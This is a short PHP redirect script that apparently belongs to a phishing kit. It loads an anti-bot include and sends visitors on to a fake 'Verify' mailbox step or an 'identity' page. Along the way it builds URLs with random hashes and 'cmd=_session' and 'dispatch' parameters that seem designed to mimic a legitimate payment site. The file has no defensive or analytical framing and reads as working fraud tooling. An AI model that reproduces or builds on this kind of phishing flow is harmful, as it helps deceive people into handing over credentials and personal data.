<?php

include('../../functions/Config.php');
require_once('../Safe/xanbbx.php');

if($USE_MAILBOX == "yes") {
HEADER("Location:Verify.php?enc=".md5(microtime())."&p=0&dispatch=".sha1(microtime())."");
}
else {
HEADER("Location: ../identity/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
}